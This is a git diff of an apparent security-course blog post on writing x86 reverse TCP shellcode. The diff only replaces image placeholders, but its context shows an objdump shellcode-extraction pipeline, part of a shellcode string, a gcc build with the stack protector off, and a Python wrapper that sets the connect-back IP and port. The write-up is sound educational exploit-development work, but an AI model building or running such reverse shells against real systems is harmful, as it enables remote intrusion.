@@ -320,7 +320,7 @@ Dumping the shellcode.
 ```
 objdump -d ./shell-rev-tcp-4321|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 ```
-insert image here.
+![Assemble Link Dump-Shellcode](/assets/asn-2-assembling-linking.PNG)
 Insert the shellcode in shellcode.c template.
 ```c
 #include<stdio.h>
@@ -344,7 +344,7 @@ Compile shellcode.c:
 gcc shellcode.c -o shell-rev-4321 -fno-stack-protector -z execstack
 ```
 Now, its time to test our reverse shell. Lets setup a  netcat listener on port 4321 on our local machine and execute the reverse shell from another terminal.
-!insert image here
+![Reverse Shell LocalHost](/assets/asn-2-rev-connect.PNG)
 ### Configure IP and Port
 Python wrapper which prints out the complete shellcode given an IP and Port as command line arguments.
 ```python
@@ -419,12 +419,12 @@ shellcode = (r"\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\
 print '"'+shellcode+'"\n'
 ```
 Lets look at ip address of another machine on my network.
-insert image here
+![Another Machine on Network](/assets/asn-2-another-machine-ip.PNG)
 Run the python wrapper script with the ip address and desired port as arguments.
 ```
 python ip-port-config-shell-reverse-tcp.py 192.168.56.102 6767
 ```
-image here
+![Python Wrapper IP and Port](/assets/asn-2-ip-port-config-script.PNG)
 Once again insert the shellcode in ```shellcode.c``` then compile the file. Now its time to test our reverse shell once again.
-insert image here
+![Reverse Shell Network Machine](/assets/asn-2-connect-back-network-machine.PNG)
 
